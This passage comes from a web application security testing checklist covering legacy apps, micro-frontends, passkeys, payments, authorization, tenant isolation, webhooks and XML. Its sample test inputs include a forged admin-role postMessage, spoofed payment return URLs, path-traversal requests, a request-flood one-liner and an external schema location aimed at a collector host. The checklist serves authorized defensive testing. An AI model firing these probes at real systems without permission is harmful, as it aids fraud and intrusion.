  1. Make sure a vulnerability scan of the application and its hosts runs on a schedule.
  2. Take the last scan results. Make sure each finding has a patch or a recorded compensating control.
  3. Make sure patch priority uses the risk of the application.
  4. For findings with no patch, make sure the control, an owner and a review date exist.
  *Example:* `nessus or qualys scan report; patch ticket history`  
  *Expected:* Scans run regularly. Each finding has a patch or a compensating control with an owner and a review date.  
  *Refs:* cheatsheet: Legacy_Application_Management_Cheat_Sheet; cwe: CWE-1104; nist_800_53: RA-5, SI-2

- [ ] **WEB-LEGACY-004** Check monitoring and incident response for legacy applications  
  *Severity if fail:* Medium | *Type:* Config Review, Manual  
  *Objective:* Finds legacy applications whose attacks go unseen because logs do not reach the security tools.  
  *Steps:*
  1. Find how application logs reach the security monitoring system.
  2. If the format is not supported, look for a converter or a script that reports indicators of compromise.
  3. Make sure network traffic of the legacy environment is monitored for anomalies.
  4. Make sure the incident response plan lists the legacy application as a priority system.
  *Example:* `SIEM search for the legacy host; incident response plan`  
  *Expected:* Legacy logs or indicator reports reach the monitoring system. The incident response plan names the system as a priority.  
  *Refs:* cheatsheet: Legacy_Application_Management_Cheat_Sheet; cwe: CWE-778; nist_800_53: SI-4, IR-4

- [ ] **WEB-LEGACY-005** Check the maintainability and migration plan of legacy applications  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds legacy applications that nobody can fix or replace.  
  *Steps:*
  1. Ask who can troubleshoot and reconfigure the application. Make sure at least two people can.
  2. Make sure troubleshooting guides exist for common failures.
  3. Read the migration plan. Make sure it has steps, an expected completion date and an owner.
  4. Make sure the plan covers budget, expertise and urgency from the risk profile.
  *Example:* `Runbooks; migration plan document`  
  *Expected:* More than one person can maintain the application. A migration plan with steps, date and owner exists.  
  *Refs:* cheatsheet: Legacy_Application_Management_Cheat_Sheet; cwe: CWE-1104


## MFE

- [ ] **WEB-MFE-001** Test micro-frontend iframe sandbox and message sender checks  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find embedded features that run with the privileges of the host page or accept messages from a wrong sender.  
  *Steps:*
  1. List the micro-frontends and how the host loads each one: script, component or iframe.
  2. Look at the iframe sandbox attribute of each less-trusted feature.
  3. Make sure allow-scripts and allow-same-origin are not both set for a same-origin frame.
  4. Send a message from another frame of the same origin and from a sandboxed frame with origin null.
  5. Make sure the receiver checks event.origin, event.source and the message type and fields.
  6. Make sure a message cannot start a privileged action without a server-side check.
  *Example:* `DevTools console: frames[1].postMessage({type:"setRole",role:"admin"},"*"); grep the bundle for addEventListener("message"`  
  *Expected:* Less-trusted features run in sandboxed frames on a separate origin. Receivers check the exact origin, the source window and the message contract, and do not trust null.  
  *Refs:* owasp_top10: A06:2025, A01:2025; cheatsheet: Micro_Frontend_Security_Cheat_Sheet, Web_Frontend_Security_Cheat_Sheet; asvs: V3.5.5; cwe: CWE-346, CWE-79

- [ ] **WEB-MFE-002** Review how the host loads remote micro-frontend code  
  *Severity if fail:* High | *Type:* Config Review, Code Review | *Level:* ASVS L2  
  *Objective:* Find remote code loading where an attacker or a compromised remote can change the running host application.  
  *Steps:*
  1. List all remote entry URLs and the place where each URL is set.
  2. Make sure the URLs come from host configuration and not from a query parameter or user input.
  3. Make sure each remote uses HTTPS and an immutable, reviewed release.
  4. Make sure Subresource Integrity covers the entry script and the dynamic chunks.
  5. Make sure the Content-Security-Policy allows only the approved remote origins.
  6. Make sure the shell and each remote have separate deployment credentials.
  *Example:* `grep -R "remoteEntry" dist/; check webpack ModuleFederation config; curl -sI of the Content-Security-Policy header`  
  *Expected:* Only approved HTTPS remotes at fixed releases load. Integrity and CSP controls cover the dynamic chunks. Deployment credentials are separate.  
  *Refs:* owasp_top10: A03:2025, A08:2025; cheatsheet: Micro_Frontend_Security_Cheat_Sheet; asvs: V3.6.1; cwe: CWE-829, CWE-494; other: OWASP DevGuide web app checklist: 02-frameworks-libraries.md


## PASSKEY

- [ ] **WEB-PASSKEY-001** Test passkey registration for account binding and recent authentication  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find passkey enrollment that lets an attacker add a credential to the account of a victim.  
  *Steps:*
  1. Add a passkey with a long-lived session and make sure the application asks for recent re-authentication.
  2. Start registration as user A and send the response from user B.
  3. Change the user ID or account value in the registration request.
  4. Send the registration request from another site and make sure CSRF checks block it.
  5. Look for rate limits and a notice to the user after enrollment.
  *Example:* `Burp: intercept POST /webauthn/register/finish and change the userId; replay the options request without a fresh login`  
  *Expected:* The server asks for recent authentication, uses the account from its own ceremony state and ignores an account identifier from the client. The user gets a notice.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Passkey_Security_Cheat_Sheet; cwe: CWE-287, CWE-306; wstg: WSTG-ATHN-04; other: OWASP DevGuide web app checklist: 06-digital-identity.md

- [ ] **WEB-PASSKEY-002** Test WebAuthn ceremony checks for challenge, origin and user verification  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find a relying party that accepts a replayed, forged or wrong-scope passkey response.  
  *Steps:*
  1. Capture a valid registration and a valid sign-in response with a virtual authenticator.
  2. Replay the sign-in response and make sure the server rejects the used challenge.
  3. Wait until the challenge expires and send the response.
  4. Change the type, the origin and the RP ID hash in the client data and send it again.
  5. Use a registration challenge in a sign-in and a challenge of one account for another account.
  6. Clear the user verification flag where the policy needs it.
  *Example:* `Chrome DevTools WebAuthn panel (virtual authenticator); Burp Repeater on /webauthn/authenticate/finish`  
  *Expected:* The server accepts only an unused and unexpired challenge of the right ceremony and account. Type, origin, RP ID and flags must match the policy. A used response fails.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Passkey_Security_Cheat_Sheet; cwe: CWE-294, CWE-287; wstg: WSTG-ATHN-04

- [ ] **WEB-PASSKEY-003** Test passkey management, revocation and the last credential  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Find credential management that allows silent changes or leaves a revoked passkey valid.  
  *Steps:*
  1. Open the passkey management page and look at the data shown, such as name and last use.
  2. Remove a passkey and use it to sign in again.
  3. Try to add or remove a passkey without recent re-authentication.
  4. Try to remove the last sign-in method.
  5. Make sure the user gets a notice when a passkey is added or removed.
  6. Look at the audit log for enrollment, use and revocation events.
  *Example:* `Virtual authenticator in Chrome DevTools; sign in with a removed credential ID`  
  *Expected:* A removed passkey stops working at once. Changes need recent authentication, send a notice, and are logged. The last method cannot be removed without a safe recovery path.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Passkey_Security_Cheat_Sheet; cwe: CWE-287; wstg: WSTG-ATHN-07; other: OWASP DevGuide web app checklist: 06-digital-identity.md

- [ ] **WEB-PASSKEY-004** Test account recovery and fallback paths for bypass of passkey login  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find recovery or fallback methods that are weaker than the passkey and let an attacker take over the account.  
  *Steps:*
  1. List all recovery and fallback methods for an account with a passkey.
  2. Fail a passkey sign-in and look for a silent fallback to a password, SMS or email code.
  3. Start recovery with only email access and look at what the user gets.
  4. Make sure recovery codes are single-use and hashed, and that the user can create new ones.
  5. After recovery, look at the sessions and the old credentials, and make sure the user gets a notice.
  *Example:* `Use the forgot password and lost device flows with a test mailbox; compare the steps with the passkey sign-in`  
  *Expected:* Recovery is not weaker than the passkey for high-risk accounts. Recovery codes work once. Recovery ends old sessions and the user gets a notice.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Passkey_Security_Cheat_Sheet; cwe: CWE-640, CWE-287; wstg: WSTG-ATHN-10, WSTG-ATHN-09; other: OWASP DevGuide web app checklist: 06-digital-identity.md


## PAY

- [ ] **WEB-PAY-001** Test payment gateway return and callback handling for spoofing  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find checkout flows that mark an order as paid because of a forged return URL or callback.  
  *Steps:*
  1. Find the return URL and the callback URL that the gateway uses.
  2. Call the return URL with a changed status, amount and order ID.
  3. Send a callback with no signature and with a wrong signature.
  4. Send a valid callback twice and look for a second fulfillment.
  5. Send a callback with a different amount or currency than the order.
  6. Check that the server asks the gateway API for the payment status before it fulfills the order.
  7. Check that the server calculates the order total again from trusted data.
  *Example:* `curl "https://target/checkout/return?order=1001&status=paid&amount=0.01"; replay the gateway callback with curl --data-binary`  
  *Expected:* Only a verified server-to-server callback with matching order, amount and currency completes an order. Return URL values are not trusted. A repeated callback has no second effect.  
  *Refs:* owasp_top10: A06:2025, A08:2025; cheatsheet: Third_Party_Payment_Gateway_Integration_Cheat_Sheet; wstg: WSTG-BUSL-10; cwe: CWE-345, CWE-602; other: OWASP DevGuide web app checklist: 05-validate-inputs.md


## PDP

- [ ] **WEB-PDP-001** Test that policy decision errors and timeouts deny access  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find enforcement points that allow a request when the policy decision service fails, times out or returns unusable output.  
  *Steps:*
  1. Find the enforcement points and the policy decision service that each one calls.
  2. Stop the decision service or block the network path to it, in a test environment.
  3. Send requests to protected operations and look at the result.
  4. Return a slow, empty or malformed answer from a decision service test double.
  5. Send a batch decision request with one missing item result and look at that item.
  6. Look for a gateway setting that allows traffic when authorization fails.
  *Example:* `Block the PDP port with iptables; curl -i https://target/api/admin/users; check Envoy ext_authz failure_mode_allow`  
  *Expected:* Every protected operation is denied when a valid decision is not available. A missing or invalid item in a batch is denied.  
  *Refs:* owasp_top10: A01:2025, A10:2025; cheatsheet: Authorization_Patterns_Cheat_Sheet, Authorization_Decisions_And_Output_Handling_Cheat_Sheet; asvs: V8.1.1; cwe: CWE-636, CWE-862; other: OWASP DevGuide web app checklist: 07-access-controls.md

- [ ] **WEB-PDP-002** Test list, search, export and count paths for authorization filters  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find collection endpoints that return or count objects that the user may not access, even when single-object reads are safe.  
  *Steps:*
  1. List the endpoints that return collections: list, search, export, count and aggregate.
  2. Call each endpoint as a low-privilege user and as a user of another tenant.
  3. Compare the returned items, the total count and the facets with the allowed items.
  4. Add filter and sort parameters with unusual operators and field names.
  5. Use a returned identifier in an update or delete request.
  6. Stop the policy service and look at the collection result: a missing filter must not mean all items.
  *Example:* `curl -H "Authorization: Bearer <userB>" "https://target/api/orders?limit=1000&sort=-created"; GET /api/orders/count; GET /api/orders/export.csv`  
  *Expected:* Collection paths return and count only the objects that the user may access. Unsupported filters and missing policy output are denied. A listed item does not authorize later changes.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Authorization_Decisions_And_Output_Handling_Cheat_Sheet; wstg: WSTG-ATHZ-04; asvs: V8.2.2; cwe: CWE-639, CWE-285

- [ ] **WEB-PDP-003** Review how authorization policy and data reach the decision points  
  *Severity if fail:* High | *Type:* Config Review, Manual | *Level:* ASVS L3  
  *Objective:* Find policy distribution that lets old rules stay active, accepts unsigned policy or leaves decision APIs open.  
  *Steps:*
  1. Find who may change each policy and attribute, and the maximum delay for a change to take effect.
  2. Change a role or revoke a permission and measure the time until each decision point denies access.
  3. Look for signature checks on policy bundles before activation.
  4. Try to load an unsigned or old policy bundle in a test environment.
  5. Make sure the decision and policy administration APIs need authentication and tenant scope.
  6. Make sure a decision point with missing or old data denies the affected operations.
  *Example:* `opa run --server --verification-key key.pem ...; curl http://pdp:8181/v1/policies without credentials`  
  *Expected:* Policy changes reach all decision points within the set delay. Only signed and approved bundles load. Old data or a missing bundle leads to deny. Policy APIs need authentication.  
  *Refs:* owasp_top10: A01:2025, A08:2025; cheatsheet: Authorization_Policy_And_Data_Distribution_Cheat_Sheet; asvs: V8.3.2; cwe: CWE-285, CWE-345

- [ ] **WEB-PDP-004** Check that an automated authorization matrix runs on every release  
  *Severity if fail:* Medium | *Type:* Config Review, Automated | *Level:* ASVS L2  
  *Objective:* Find access rules that break over time because no automated test checks them against the documented matrix.  
  *Steps:*
  1. Find the authorization matrix: roles, resources and actions in a machine-readable file.
  2. Make sure every service and route in the application appears in the matrix.
  3. Run the matrix tests and look for each allowed and each denied combination.
  4. Add a new route without a matrix entry and make sure the pipeline fails or alerts.
  5. Make sure the tests cover horizontal, vertical and cross-tenant access and use two accounts per role.
  6. Make sure the pipeline stops the release when a test fails.
  *Example:* `CI job output; pytest or Newman suite generated from authz-matrix.yaml with expected 200/403 for each role`  
  *Expected:* A machine-readable matrix drives automated tests in the release pipeline. New routes without an entry fail the build. A failed test stops the release.  
  *Refs:* owasp_top10: A01:2025, A06:2025; cheatsheet: Authorization_Regression_Testing_Cheat_Sheet, Authorization_Testing_Automation_Cheat_Sheet; asvs: V8.1.1; cwe: CWE-863, CWE-285; other: OWASP DevGuide web app checklist: 07-access-controls.md


## PQC

- [ ] **WEB-PQC-001** Test post-quantum hybrid key exchange, fallback and dual signature checks  
  *Severity if fail:* Medium | *Type:* Manual, Config Review  
  *Objective:* Find deployments where post-quantum protection is not used, is silently dropped, or where one of two signatures is enough.  
  *Steps:*
  1. Open the connection from real clients through the proxy, the gateway and the back end.
  2. Look at the negotiated key exchange group of each connection.
  3. Block the post-quantum group at the client and look for a silent retry with classical algorithms where PQC is required.
  4. Send a signature object where one of two required signatures is missing or wrong.
  5. Test the handshake time and the limits for certificate, message and field sizes.
  6. Look at logs and alerts for connections that use classical algorithms only.
  *Example:* `openssl s_client -connect target:443 -groups X25519MLKEM768 -brief; curl --curves X25519MLKEM768 -v https://target; wireshark ClientHello`  
  *Expected:* Required paths use the hybrid exchange and fail without a silent classical retry. Both signatures must be valid. Classical-only use is logged and approved as an exception.  
  *Refs:* owasp_top10: A04:2025; cheatsheet: Post_Quantum_Cryptography_Cheat_Sheet; cwe: CWE-327, CWE-757


## TENANT

- [ ] **WEB-TENANT-001** Test database tenant isolation with the request role and pooled connections  
  *Severity if fail:* Critical | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find shared-table tenant isolation that fails because of a privileged database role, missing policies or a reused connection.  
  *Steps:*
  1. List the tables that hold tenant data and the isolation method for each, such as row-level security.
  2. Read the database role of the request path. Make sure it is no superuser and has no BYPASSRLS attribute.
  3. Make sure every tenant table has a policy that is enforced.
  4. Send requests for tenant A and then tenant B over the same pooled connection.
  5. Send a request with no tenant context and look at the result.
  *Example:* `psql: SELECT rolname,rolsuper,rolbypassrls FROM pg_roles WHERE rolname='<app_role>'; SELECT relname,relrowsecurity,relforcerowsecurity FROM pg_class WHERE relname IN (<tables>)`  
  *Expected:* The request role cannot bypass row security. Each tenant table has an enforced policy. Tenant context does not carry over between pooled requests, and a missing context denies access.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Multi_Tenant_Security_Cheat_Sheet; cwe: CWE-639, CWE-284; asvs: V8.4.1

- [ ] **WEB-TENANT-002** Test cache keys for tenant and user scope  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find application caches that serve one tenant data to another tenant because the key has no tenant context.  
  *Steps:*
  1. List the caches in use and the key format of each.
  2. Make sure each key of tenant data holds the tenant identifier and the other inputs that change the result.
  3. Fill the cache as user A of tenant A, then request the same object ID as tenant B.
  4. Use the same user ID in two tenants and compare the cached results.
  5. Make sure the request is authorized before a cached value is read.
  *Example:* `redis-cli --scan --pattern "*" | head; compare keys such as prefs:42 and tenantA:prefs:42`  
  *Expected:* Keys of tenant data hold the tenant identifier. A cached value never goes to another tenant. Shared entries live in a documented global namespace.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Multi_Tenant_Security_Cheat_Sheet, Web_Cache_Security_Cheat_Sheet; cwe: CWE-524, CWE-639; asvs: V8.4.1

- [ ] **WEB-TENANT-003** Test background jobs and queue messages for tenant context  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find asynchronous work that runs with a tenant identifier from the message that nobody authorized.  
  *Steps:*
  1. List the queues and job types that process tenant data.
  2. Send a message to the queue with the tenant identifier of another tenant, in a test environment.
  3. Check if the consumer authenticates the producer and authorizes the action again.
  4. Look at idempotency keys and retry state and check that they are scoped by tenant.
  5. Flood the queue as one tenant and measure the delay for another tenant.
  *Example:* `Publish a job JSON with a changed tenant_id to the test broker; compare the job result and the audit log`  
  *Expected:* The consumer trusts only authenticated producers and checks the action again. Idempotency keys and retries are per tenant. One tenant cannot starve the others.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Multi_Tenant_Security_Cheat_Sheet; cwe: CWE-639, CWE-400; asvs: V8.4.1

- [ ] **WEB-TENANT-004** Test file storage and signed URLs for tenant isolation  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find object storage where one tenant can read, change or delete the objects of another tenant.  
  *Steps:*
  1. List how tenant files are named and which bucket, key prefix or policy keeps tenants apart.
  2. Request the object key of tenant A as a user of tenant B.
  3. Change the tenant part of a path with ../ and with a similar tenant name prefix.
  4. Make sure a signed URL covers one object, one action, and a short time.
  5. Check if the client tenant metadata is trusted for authorization.
  *Example:* `curl -b "session=<tenantB>" https://target/files/tenants/acme/report.pdf ; try tenants/acme-corp/ and tenants/acme/../acme-corp/`  
  *Expected:* The server authorizes the exact tenant, object and action for each request. Prefixes are not a boundary. Signed URLs are narrow and expire.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Multi_Tenant_Security_Cheat_Sheet; cwe: CWE-639, CWE-22; asvs: V8.4.1

- [ ] **WEB-TENANT-005** Test tenant offboarding, data deletion and backup restore  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find tenant lifecycle gaps that leave access or data after offboarding, or that mix tenants in a restore.  
  *Steps:*
  1. Offboard a test tenant.
  2. Make sure the sessions, API keys and tokens of the tenant stop working at once.
  3. Look for tenant data left in caches, object versions, exports and replicas.
  4. Check that deletion of the tenant prefix does not match other tenants, such as tenants/acme and tenants/acme-corp.
  5. Restore one tenant from a shared backup and look for the data of other tenants.
  6. Try a restore request as an unauthorized operator.
  *Example:* `Use the tenant admin API to delete tenant "acme" in a test environment; then replay its API key and list the storage prefixes`  
  *Expected:* Offboarding stops all tenant access and removes data by the retention policy. Other tenants are not affected. A restore adds only data of the target tenant and needs authorization.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Multi_Tenant_Security_Cheat_Sheet; cwe: CWE-284, CWE-459; asvs: V8.4.1

- [ ] **WEB-TENANT-006** Test tenant-aware rate limits and shared resource quotas  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find shared services where one tenant can use all capacity and slow down the other tenants.  
  *Steps:*
  1. Find the shared resources: API, queue, worker pool, connection pool and storage.
  2. Check if the limits have the tenant identity as one dimension.
  3. Send a high request rate as tenant A and measure the response time for tenant B.
  4. Make sure the limit counters work across all application instances.
  5. Make sure throttled responses use HTTP 429 and Retry-After.
  *Example:* `ab or k6 with tenant A token at the limit rate while tenant B runs a steady request every second; compare latency`  
  *Expected:* The tenant A load does not change the service for tenant B. Limits are per tenant and apply on every instance.  
  *Refs:* owasp_top10: A06:2025; cheatsheet: Multi_Tenant_Security_Cheat_Sheet; cwe: CWE-400, CWE-770; asvs: V8.4.1


## THREAT

- [ ] **WEB-THREAT-001** Check the system model with data flows and trust boundaries  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds systems whose threat model is missing, out of date or without trust boundaries.  
  *Steps:*
  1. Ask for the data flow diagram or a comparable system model.
  2. Make sure it shows trust boundaries, data flows, data stores, processes and external entities.
  3. Compare the diagram with the real system. Look for missing components and flows.
  4. For cloud systems, make sure the model shows IAM roles, managed services, storage and the shared responsibility split.
  *Example:* `Data flow diagram in a format that the team can update, such as a threat model file in the repository`  
  *Expected:* The model matches the real system and shows trust boundaries. The team stores it in an updatable form.  
  *Refs:* cheatsheet: Threat_Modeling_Cheat_Sheet; cwe: CWE-1059

- [ ] **WEB-THREAT-002** Check that threat identification uses a fitting technique for each component  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds threat models that skip components or use a technique that does not fit the scope.  
  *Steps:*
  1. Read the threat list. Make sure each threat names the affected component, data flow or trust boundary.
  2. Make sure the team used STRIDE or another fitting technique and wrote why it fits.
  3. Pick three components. Make sure all six STRIDE categories were examined for each.
  4. Make sure each threat has a rank based on likelihood and impact.
  *Example:* `Threat register with columns: id, component, STRIDE category, likelihood, impact, response`  
  *Expected:* Every component has threats from a fitting technique. Each threat has a rank and an affected element.  
  *Refs:* cheatsheet: Threat_Modeling_Cheat_Sheet; cwe: CWE-1059

- [ ] **WEB-THREAT-003** Check that each threat has a response and a testable security requirement  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds threats that stay without an owner, a response or a way to test the mitigation.  
  *Steps:*
  1. Take ten threats from the register.
  2. Make sure each has one response: mitigate, eliminate, transfer or accept.
  3. For mitigations, make sure a security requirement and an implementation record exist.
  4. For accepted risks, make sure the reason and an approver are on record.
  5. Make sure a test can show whether each requirement is met.
  *Example:* `Threat register linked to the issue tracker and to test cases`  
  *Expected:* Every threat has a response. Mitigations map to testable requirements. Accepted risks have an approver and a reason.  
  *Refs:* cheatsheet: Threat_Modeling_Cheat_Sheet

- [ ] **WEB-THREAT-004** Check stakeholder review and updates of the threat model  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds threat models that nobody reviewed or that the team never updated after design changes.  
  *Steps:*
  1. Make sure the review included development, security and other stakeholders.
  2. Make sure the review checked the diagram, the threat list, the responses and the documents.
  3. Compare the date of the last update with the last major design change.
  4. Make sure the team stores the artifacts so that only people with need to know can read them.
  *Example:* `Review minutes; access list of the threat model repository`  
  *Expected:* Stakeholders reviewed the model. The team updates it after design changes. Access to it is limited.  
  *Refs:* cheatsheet: Threat_Modeling_Cheat_Sheet


## VDP

- [ ] **WEB-VDP-001** Check that a security.txt file gives a valid way to report vulnerabilities  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds sites where researchers cannot find a contact for security reports.  
  *Steps:*
  1. Request /.well-known/security.txt over HTTPS.
  2. Make sure the file has a Contact field and an Expires field in the future.
  3. Make sure the contact address or form works and reaches the security team.
  4. If the file lists an encryption key or a policy link, make sure they work.
  *Example:* `curl -si https://HOST/.well-known/security.txt`  
  *Expected:* The file at /.well-known/security.txt has a valid Contact and a future Expires. Its links work.  
  *Refs:* cheatsheet: Vulnerability_Disclosure_Cheat_Sheet; cwe: CWE-1059

- [ ] **WEB-VDP-002** Check the reporting guidelines, safe harbor and response timeline  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds disclosure policies that leave researchers without scope, legal protection or a response promise.  
  *Steps:*
  1. Read the published disclosure policy.
  2. Make sure it states the scope, the information to include, and a PGP key or other secure channel.
  3. Make sure it states safe harbor provisions and a timeline for first response and triage.
  4. For a bug bounty, make sure it states eligible bug types, rewards and the in-scope systems.
  *Example:* `Policy page linked from security.txt; disclose.io policy template`  
  *Expected:* The policy states scope, secure channel, safe harbor and response timeline. Bounty rules state scope and rewards.  
  *Refs:* cheatsheet: Vulnerability_Disclosure_Cheat_Sheet

- [ ] **WEB-VDP-003** Test the handling of a vulnerability report from receipt to closure  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds intake processes that lose reports or leave researchers without feedback.  
  *Steps:*
  1. Send a harmless test report to the published contact, or ask the team for three recent reports.
  2. Make sure frontline staff on the main contact address know where to send security reports.
  3. Make sure the researcher got an acknowledgement and a triage timeline.
  4. Make sure the process includes updates, a fix confirmation and a retest request.
  5. Make sure the team asks for payment details only through a mediated platform when a researcher demands money first.
  *Example:* `Test report mail to security@ or the policy address; ticket history of recent reports`  
  *Expected:* Reports reach the security team. The researcher gets acknowledgement, updates and closure within the stated times.  
  *Refs:* cheatsheet: Vulnerability_Disclosure_Cheat_Sheet

- [ ] **WEB-VDP-004** Check that security advisories have the required details  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds fixed vulnerabilities that users cannot learn about or act on.  
  *Steps:*
  1. Find the advisory page, mailing list or release notes links.
  2. Take one recent advisory. Make sure it has a summary with impact, vulnerable versions and fixed versions.
  3. Make sure it states conditions, workarounds and a CVE ID when one exists.
  4. Make sure the advisory credits the researcher and links from the changelog.
  *Example:* `curl -s https://HOST/security/advisories; compare with the release notes of the fixed version`  
  *Expected:* Advisories list impact, affected and fixed versions, workarounds and CVE ID. Users find them from the site and the changelog.  
  *Refs:* cheatsheet: Vulnerability_Disclosure_Cheat_Sheet; cwe: CWE-1059


## WEBHOOK

- [ ] **WEB-WEBHOOK-001** Test webhook receivers for signature verification and downgrade  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find webhook endpoints that accept forged events because the signature is missing, weak or compared in an unsafe way.  
  *Steps:*
  1. Send a delivery with no signature header and with a wrong signature.
  2. Change one byte of the body and keep the old signature.
  3. Send a signature of an unexpected scheme or an empty signature value.
  4. Send the body re-serialized with different whitespace and key order.
  5. Look at the response: it must be 401 with no reason.
  6. Review the code for a constant-time comparison and for use of the raw body.
  7. Make sure plain HTTP is refused.
  *Example:* `curl -X POST https://target/webhooks/pay -H "X-Signature: v1=00" -d '{"id":"evt_1","type":"payment.succeeded"}'; review hmac.compare_digest or crypto.timingSafeEqual`  
  *Expected:* The receiver rejects any delivery without a valid HMAC of the raw body with 401 and a generic body. It compares in constant time and accepts only the expected scheme over HTTPS.  
  *Refs:* owasp_top10: A08:2025, A07:2025; cheatsheet: Webhook_Security_Cheat_Sheet; asvs: V4.1.5; cwe: CWE-345, CWE-347, CWE-208

- [ ] **WEB-WEBHOOK-002** Test webhook receivers for replay and duplicate events  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find webhook endpoints that process a captured or repeated delivery twice.  
  *Steps:*
  1. Capture a valid delivery in a test environment.
  2. Send it again at once and look for a second side effect, such as a second payment record.
  3. Send it again after the timestamp tolerance time.
  4. Change the timestamp and keep the signature.
  5. Send the same event ID with a new valid signature.
  6. Send events out of order.
  *Example:* `Replay with curl --data-binary @delivery.json -H @headers.txt; compare the database rows before and after`  
  *Expected:* The receiver rejects old timestamps and stored event IDs. A duplicate gets 200 and does not repeat the side effects. Out-of-order events do not corrupt the state.  
  *Refs:* owasp_top10: A08:2025, A06:2025; cheatsheet: Webhook_Security_Cheat_Sheet; cwe: CWE-294, CWE-345

- [ ] **WEB-WEBHOOK-003** Review webhook signing secret storage, scope and rotation  
  *Severity if fail:* High | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find signing secrets that leak, are shared between integrations, or stay valid after revocation.  
  *Steps:*
  1. List the webhook endpoints and their signing secrets.
  2. Make sure each webhook has its own random secret of at least 32 bytes in a secrets manager.
  3. Look in source code, images, logs and error responses for the secret and signature headers.
  4. Rotate a secret with an overlap window and make sure both secrets are accepted in it.
  5. Revoke a secret and send a delivery signed only with it.
  *Example:* `grep -R "whsec_\|webhook_secret" repo/ logs/; send a delivery signed with the revoked secret`  
  *Expected:* Each webhook has its own secret in a secrets manager. Logs hold no secrets. A revoked secret fails at once and rotation does not drop events.  
  *Refs:* owasp_top10: A04:2025, A08:2025; cheatsheet: Webhook_Security_Cheat_Sheet, Secrets_Management_Cheat_Sheet; asvs: V13.3.1; cwe: CWE-798, CWE-522

- [ ] **WEB-WEBHOOK-004** Test webhook endpoint hardening: method, size, content type and rate  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find webhook endpoints that accept bad methods, large bodies or floods, or that fail with internal details.  
  *Steps:*
  1. Send GET, PUT and DELETE requests to the endpoint and look for 405.
  2. Send an oversized body and a body with an unexpected Content-Type.
  3. Send a signed body that breaks the schema, and a payload with injection strings in the fields.
  4. Send a burst of requests and look for 429 with Retry-After.
  5. Look at error responses for stack traces.
  6. Make sure a failing event goes to a dead-letter queue and raises an alert.
  *Example:* `curl -X GET https://target/webhooks/pay; seq 1 200 | xargs -P20 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target/webhooks/pay`  
  *Expected:* The endpoint accepts POST only, with limits on size and type, and validates the schema. It limits the rate, returns generic errors, and queues failed events.  
  *Refs:* owasp_top10: A06:2025, A10:2025; cheatsheet: Webhook_Security_Cheat_Sheet; asvs: V2.4.1; cwe: CWE-770, CWE-20


## XMLSEC

- [ ] **WEB-XMLSEC-001** Test XML processing for schema poisoning and external schema loading  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find XML endpoints that load a schema or DTD from the document or from a remote location that an attacker controls.  
  *Steps:*
  1. Find the XML endpoints and the schema that each one uses.
  2. Send a document with an embedded DOCTYPE or an inline schema that removes all limits.
  3. Send a document with an xsi:schemaLocation that points to a collector host, in a test environment.
  4. Watch for a callback to the collector.
  5. Review the parser configuration for the schema source: local, read-only and fixed.
  *Example:* `curl -X POST https://target/xml -H "Content-Type: application/xml" -d '<!DOCTYPE note [<!ELEMENT note ANY>]><note>x</note>'; xsi:schemaLocation="urn:x http://collector.test/x.xsd"`  
  *Expected:* The server ignores a schema or DTD in the document and does not fetch a remote schema. It validates against a local schema that only administrators can change.  
  *Refs:* owasp_top10: A05:2025, A02:2025; cheatsheet: XML_Security_Cheat_Sheet; wstg: WSTG-INJT-07; asvs: V1.5.1; cwe: CWE-611, CWE-829; other: OWASP DevGuide web app checklist: 02-frameworks-libraries.md

- [ ] **WEB-XMLSEC-002** Test XML schema limits for data types, lengths and payload size  
  *Severity if fail:* Medium | *Type:* Manual, Config Review  
  *Objective:* Find XML schemas that accept values with no length, range or type limits, which leads to errors and resource use.  
  *Steps:*
  1. Get the schema of the XML interface or the documented message format.
  2. Look for elements typed as free strings where a number, a date or a fixed set is expected.
  3. Send a very long value for each string and number element.
  4. Send a large document and a document with many elements and attributes.
  5. Measure the response time and the server memory.
